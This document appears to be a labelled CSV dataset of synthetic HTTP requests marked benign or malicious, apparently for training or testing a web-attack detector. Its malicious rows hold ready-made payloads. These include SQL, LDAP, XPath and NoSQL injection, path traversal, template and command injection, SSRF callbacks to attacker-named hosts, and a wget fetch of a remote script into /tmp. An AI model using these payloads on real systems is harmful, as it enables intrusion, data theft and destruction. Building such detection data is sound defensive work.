label,text
benign,"GET /api/v1/memberships/list?tier=premium&active=true HTTP/1.1
Host: api.fitnesspeak.club
Accept: application/json
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.e30.s9dbbu605HEBXGGdIhI1-UTNaPRbHHeI03vYblm_cbOjwlg_T6NcslKfVko6fepNz92nqHcHz3vwTYNHzC7VgsA
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1
Accept-Encoding: br, gzip, deflate"
malicious,"POST /upload/image HTTP/1.1
Host: media-content-host.online-retail-store.biz
User-Agent: Wget/1.21.1
Accept: */*
Content-Type: application/x-www-form-urlencoded
X-Notification-Endpoint: http://rebind-callback-ssrf.attacker-domain.org/upload
Content-Length: 27

imageName=summer_vacation.jpg&tag=beach"
malicious,"PUT /api/preferences/set_advanced HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/json
Content-Length: 300
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.6
Accept-Encoding: gzip, deflate
Origin: https://dashboard.online-retail-store.biz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36

{""config"": {""user_settings"": {""preferences"": {""detail_level_param"": ""JyBVTklPTiBTRUxFQ1QgdXNlciwgcGFzc3dvcmQgRlJPTSB1c2VycyAtLQ=="", ""currency"": ""USD"", ""show_recommended"": true}, ""cart_options"": {""save_for_later"": false, ""max_items"": 100}}}}"
benign,"POST /api/v6/config/save HTTP/1.1
Host: nextgen-app-config.com
Authorization: Bearer ZG9jdW1lbnQtdXBkYXRlLWRhdGE=
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Content-Length: 108
Connection: close

{""config_b64"":""eyJlbmFibGVkIjpmYWxzZSwgImxvZ2FXcml0aW5nIjoiZGVmYXVsdCIsICJoZWFkZXIiOiAiVGVzdCBjb25maWcifQ==""}"
benign,"GET /api/v3/search?data=%7B%22filter%22%3A%22active%22%7D HTTP/1.1
Host: secure-user-portal.net
Accept: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.abcdef1234567890
User-Agent: Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
X-CSRF-Token: c3VwZXJzZWNyZXR0bzEyMw=="
benign,"GET /status HTTP/1.1
Host: logistics-cloud-hub.biz
User-Agent: UptimeRobot/2.0
Accept-Language: en-US,en;q=0.9
Connection: close"
benign,"HEAD /api/v1/status HTTP/1.1
Host: api.fast-track-services.io
User-Agent: node-fetch/1.0 (+https://github.com/bitinn/node-fetch)
Accept: */*
Connection: keep-alive"
benign,"POST /auth/login HTTP/1.1
Host: tech-support-hub.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Accept-Language: en-US,en;q=0.8
Referer: https://tech-support-hub.io/auth
Origin: https://tech-support-hub.io
Cookie: token=a3s6d792nx93irc; csrf=834ufjs
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0
Connection: keep-alive

username=sarah_connor&password=TerminatorRun$2022"
malicious,"GET /image/process?img=..%c0%ae%c0%af..%c0%ae%c0%af..%c0%ae%c0%afboot%c0%afgrub%c0%afgrub.cfg HTTP/1.1
Host: media-streaming.video-hub.ai
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: image/avif,image/webp,*/*
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
malicious,"POST /admin/moderate_comment HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 142
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15

comment_ref=123&action_param_b64=cHJvZHVjdF9pZD0xMjM7IERST1AgVEFCTEUgdXNlcnM7IC0t"
malicious,"POST /v1/search/ldap HTTP/1.1
Host: identity-authentication.cloudworks.co.uk
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Content-Type: application/json
Accept: application/json, */*
Content-Length: 98

{""searchFilter"": ""(uid=mobileuser)(objectClass=inetOrgPerson))(|(uid=administrator)""}"
benign,"GET /products;category=books/featured HTTP/1.1
Host: urban-reading-hub.co
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1"
benign,"GET /products/electronics/cameras HTTP/1.1
Host: best-buy-online.biz
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.7
Referer: https://best-buy-online.biz/
Cookie: cart_id=7f9b0c3a-12a4-4dd6-84d7-abbcd1ffe92a; last_visited=2024-06-10T14%3A22%3A17Z
DNT: 1
Sec-CH-UA: ""Chromium"";v=""114"", ""Google Chrome"";v=""114"", "";Not A Brand"";v=""99""
Sec-CH-UA-Mobile: ?1
Sec-CH-UA-Platform: ""Android"""
benign,"GET /dashboard/user/overview HTTP/1.1
Host: secure-user-portal.net
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Cookie: session_id=3f5e7a1d89cd4b339bfa26e91f7e8c12; auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9; theme=light; remember_me=1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
benign,"GET /search?q=organic+coffee+shops+near+me HTTP/1.1
Host: greenfield-coffeehouse.biz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html
Referer: https://greenfield-coffeehouse.biz/
Connection: keep-alive"
malicious,"POST /admin/api/update HTTP/1.1
Host: admin-control-panel.net
User-Agent: Python-urllib/3.9
Content-Type: application/x-www-form-urlencoded
Accept: application/json
Content-Length: 65

config=enabled%0aid%0awhoami%0als%20-la%20/tmp"
malicious,"POST /api/account/update HTTP/1.1
Host: logon.secure-payment-gateway.cc
Content-Type: application/json
X-CSRF-Token: fbc12ca8d0b440c9ba70db952457fa94
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Linux; Android 9; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36
Accept-Language: en-US,en;q=0.5
Referer: https://logon.secure-payment-gateway.cc/dashboard
Cache-Control: max-age=0

{
  ""username"": ""pay_user77"",
  ""email"": ""payuser77@secure-payment-gateway.cc"",
  ""isAdmin"": true,
  ""subscription_plan"": ""vip""
}"
malicious,"PUT /api/configureDevice HTTP/1.1
Host: secure-device-mgmt.org
User-Agent: curl/7.77.0
Accept: */*
Content-Type: application/json
Content-Length: 154
Origin: https://secure-device-mgmt.org

{""device_name"":""sensor-77"",""command"":""restart || wget http://malicious-update.cloud-data-services.ai/update.sh -O /tmp/update.sh"",""auth_token"":""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9""}"
malicious,"GET /api/v2/render_page?content=%7B%7B%207*%277%27%7D%7D HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Accept: */*
Connection: close"
benign,"HEAD /index.html HTTP/1.1
Host: local-events-calendar.us
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: https://local-events-calendar.us/home
Cache-Control: no-cache"
malicious,"POST /internal/ldap/search HTTP/1.1
Host: corp-infra-access.io
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/json
Content-Type: application/json
Content-Length: 95
Referer: https://corp-infra-access.io/dashboard

{""searchFilter"": ""(cn=analytics)(objectClass=person)(!(employeeType=contractor))(|(uid=administrator))""}"
benign,"GET /articles/2024/06/latest-tech-trends HTTP/1.1
Host: techinsights-mobile.ai
User-Agent: Mozilla/5.0 (Linux; Android 8.0.0; Googlebot/2.1; +http://www.google.com/bot.html) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
benign,"GET /static/v3/assets/css/modern-theme.css HTTP/1.1
Host: online-retail-store.biz
Accept: text/css,*/*;q=0.1
Accept-Language: fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Connection: keep-alive
Cache-Control: max-age=3600"
benign,"POST /api/v1/comments/add HTTP/1.1
Host: cloud-interface-solutions.ai
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 230
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Referer: https://cloud-interface-solutions.ai/docs/tutorial
Accept: text/html,application/xhtml+xml
Accept-Language: en-GB,en;q=0.8

comment=I+wrote+this+function%3A+function()%7Bconsole.log%28%27Hello+world%27%29%3B%7D+Should+I+wrap+it+inside+a+script+tag+when+embedding+in+HTML%3F"
benign,"GET /user_uploads/pics/nature-scenery_2023_07_18.jpg HTTP/1.1
Host: greenleaf-photo-services.ai
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: https://greenleaf-photo-services.ai/gallery/landscapes
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
Connection: keep-alive"
benign,"POST /users/request_password_reset HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://community.game-dev-forum.org/login
Accept-Language: en-GB,en;q=0.5
Connection: keep-alive
Cache-Control: max-age=0

email=emily.wang%40gdfcommunity.org"
benign,"GET /files/../images/logo.png HTTP/1.1
Host: developer-portal-cloud.tools
Accept: image/svg+xml,image/*;q=0.9,*/*;q=0.8
User-Agent: Python-urllib/3.11
Connection: close"
malicious,"GET /blog/article/view HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: https://newsletter.my-personal-blog-site.info/archive{# {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }} #}
Accept-Language: en-us
Accept-Encoding: gzip, deflate
Connection: keep-alive"
malicious,"GET /services/fetch_info HTTP/1.1
Host: global-inventory.sync-platform.ai
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
X-Data-Source: http://delayed-ssrf-check.dynamic-rebind.zone/get-info
Connection: keep-alive
Upgrade-Insecure-Requests: 1"
malicious,"POST /app/v1/catalog/query HTTP/1.1
Host: smart-solutions-cloud.ai
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36
Accept: text/xml,application/xml
Content-Type: application/xml
Content-Length: 146
Origin: https://dashboard.smart-solutions-cloud.ai

<searchRequest><term>' or '1'='1' or name()='</term><category>gadgets</category></searchRequest>"
malicious,"POST /api/v4/search/accounts HTTP/1.1
Host: secure-login-hub.org
User-Agent: Wget/1.21.1 (linux-gnu)
Content-Type: application/json
Accept: */*
Cookie: auth=eyJhbGciOiJIUzI1NiJ9.ghi789rst

{""query"":{""$where"":""this.username=='admin' && this.password.startsWith('a') || sleep(5000)""}}"
benign,"POST /api/votes HTTP/1.1
Host: local-democracy.cloud
User-Agent: Python-requests/2.28.1
Content-Type: application/x-www-form-urlencoded
Accept: application/json
Content-Length: 21
Connection: close

poll_id=33&choice_id=4"
malicious,"POST /user/validate HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 122
Connection: close

userId=admin' and substring(concat(//userdata/user[1]/password, 'XYZ'), substring(string-length(//userdata/user[1]/password),1,1), 1)='Z"
benign,"POST /users/me/update HTTP/1.1
Host: user-api.digital-growth.co.uk
Authorization: Bearer a1b2c3d4e5f6g7h8i9j0k
Content-Type: application/json
Accept: application/json
Accept-Encoding: gzip, deflate, br
DNT: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0
Content-Length: 83

{""isAdmin"":false,""displayName"":""EthanRodriguez"",""notifications"":{""email"":true,""sms"":false}}"
benign,"GET /blog/health/benefits-meditation HTTP/1.1
Host: mindful-living-journal.org
User-Agent: Mozilla/5.0 (Linux; Android 9; Nexus 5X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.136 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: text/html,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: br, gzip, deflate
Accept-Language: en-US,en;q=0.7
DNT: 1
Connection: keep-alive"
benign,"GET /blog/articles/2024/tech-trends HTTP/1.1
Host: my-personal-blog-site.info:3001
Connection: keep-alive
Accept: text/html
Accept-Language: en-US,en;q=0.8
Cache-Control: max-age=0
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Referer: https://my-personal-blog-site.info/blog"
benign,"POST /account/settings HTTP/1.1
Host: connect-portal.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 112
Accept: text/html,application/xhtml+xml
Referer: https://connect-portal.org/account/settings
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Cookie: session_token=3f91c2b7f5d99ab72f98bcf5ee973a0e
Origin: https://connect-portal.org
Connection: keep-alive

display_name=Emma+Rosario&bio=Lover+of+classical+music+and+traveling.&website_url=http%3A%2F%2Femmarosario.org&location=Boston%2C+MA"
benign,"POST /logout HTTP/1.1
Host: member-access-center.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: https://member-access-center.io
Referer: https://member-access-center.io/account/dashboard
Cookie: session_id=3f8a56cd74b2a9e1f23d
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9

_csrf=gh54fg875fg8h5gf"
malicious,"GET /api/v1/account/settings HTTP/1.1
Host: devops-control-panel.tech
X-Forwarded-Host: evil-tracking-domain.net
User-Agent: Python-urllib/3.9
Accept: application/json
Accept-Encoding: gzip
X-Requested-With: XMLHttpRequest
Connection: keep-alive"
benign,"PUT /api/v4/orders/987654321 HTTP/1.1
Host: express-delivery-service.net
Authorization: Bearer XyZ!@#9876543210abc987
Content-Type: application/xml
Accept: application/xml
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Content-Length: 138

<?xml version=""1.0""?>
<order>
  <status>shipped</status>
  <tracking_number>1Z999AA10123456784</tracking_number>
  <estimated_delivery>2024-06-15</estimated_delivery>
</order>"
benign,"GET /blog/article/view/2389 HTTP/1.1
Host: my-personal-blog-site.info
Accept: text/html,application/xhtml+xml,application/xml;q=0.8
Accept-Language: fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5
DNT: 1
Cache-Control: max-age=0
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0"
benign,"GET /v1/events/recent?pageToken=RXZlbnRzLTIwMjM=&filters=eyJzZXJ2aWNlIjoiY29mZmVlIn0= HTTP/1.1
Host: community.game-dev-forum.org
Accept: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0
Accept-Language: en-GB,en;q=0.7
Connection: keep-alive"
benign,"POST /logout HTTP/1.1
Host: rental-apartments-europe.eu
Connection: keep-alive
Referer: https://rental-apartments-europe.eu/dashboard
Cookie: app_session=566415aa7f9c4d3d8c67d059c25b7d58; preferred_language=en-GB
User-Agent: curl/7.88.1
Content-Length: 0"
benign,"GET /api/xml/orders?status=completed&limit=100 HTTP/1.1
Host: global-marketsearch.biz
Accept: application/xml
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.gzt23R_jIDmt2kuR12wup41n
Cache-Control: no-cache
Connection: keep-alive"
benign,"POST /api/v1/device/register HTTP/1.1
Host: iot-network-manager.ai
Accept: application/json
X-Requested-With: XMLHttpRequest
Content-Type: application/json
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36
Content-Length: 131
Connection: keep-alive

{""deviceId"":""device-97824"",""model"":""XTracker-Pro"",""osVersion"":""14.1.3"",""owner"":""user1275"",""capabilities"":{""gps"":true,""bluetooth"":true}}"
benign,"GET /api/healthz HTTP/1.1
Host: microservice-api.cloudfleet.local
User-Agent: python-requests/2.28.1
Accept: application/json
Connection: keep-alive"
benign,"GET /api/v1/weather/forecast?city=seattle&units=metric HTTP/1.1
Host: realtime-weather-stream.ai
Accept: application/json
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept-Language: en-US
Connection: keep-alive"
benign,"POST /account/settings/privacy HTTP/1.1
Host: secure-user-portal.net
Content-Type: multipart/form-data; boundary=----BoundaryUK7sDjZqelp1aOWZ
Content-Length: 276
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Cache-Control: no-cache
Pragma: no-cache
Connection: keep-alive

------BoundaryUK7sDjZqelp1aOWZ
Content-Disposition: form-data; name=""profile_visibility""

friends_only
------BoundaryUK7sDjZqelp1aOWZ
Content-Disposition: form-data; name=""search_engine_index""

disabled
------BoundaryUK7sDjZqelp1aOWZ
Content-Disposition: form-data; name=""data_sharing""

opt_out
------BoundaryUK7sDjZqelp1aOWZ--"
